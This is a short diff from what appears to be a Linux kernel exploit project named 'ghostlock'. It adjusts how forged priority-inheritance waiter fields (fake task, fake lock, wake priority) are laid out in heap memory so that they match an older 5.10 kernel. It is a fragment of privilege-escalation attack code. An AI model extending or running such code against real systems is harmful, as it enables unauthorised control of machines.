@@ -316,7 +316,9 @@ namespace ghostlock::route {
                 {7, request->target, "pi_left"},
                 {8, (session::g_exploit_session.heap.current.fake_task), "task"},
                 {9, (session::g_exploit_session.heap.current.fake_lock), "lock"},
-                {10, (static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) | 3, "wake_prio"},
+                {10, compact == 2 ? static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO)
+                                  : ((static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) | 3),
+                 "wake_prio"}, /* 5.10 legacy: prio low half, no wake_state (padding high) */
                 {11, 0, "deadline"},
                 {12, 0, "ww_ctx"},
             };
